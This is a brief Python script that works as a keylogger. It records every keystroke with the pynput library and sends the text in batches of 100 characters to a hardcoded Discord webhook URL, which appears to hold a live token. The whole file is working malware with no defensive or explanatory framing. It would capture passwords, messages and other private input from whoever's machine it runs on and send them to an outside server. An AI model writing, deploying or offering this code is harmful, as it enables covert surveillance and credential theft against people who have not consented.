from pynput import keyboard
import time
import requests

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1314598947494301766/9e3u1FROKR8Uxfol8WgghR9w6HU7P1Ngkx6hKhPx1_2mynJSMGAcls5yVgIbZgazs1Jw"


# Captured keystrokesx
captured_data = ""

# Callback function for key press events
def on_press(key):
    global captured_data
    try:
        captured_data += key.char
    except AttributeError:
        captured_data += f"[{key.name}]"

    # Send data to Discord every 100 characters
    if len(captured_data) >= 100:
        send_to_discord(captured_data)
        captured_data = ""

# Function to send data to Discord
def send_to_discord(data):
    try:
        response = requests.post(webhook_url, json={"content": data})
        if response.status_code == 200:
            print("Data sent to Discord!")
        else:
            print(f"Failed to send data: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {e}")

# Main loop to listen for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
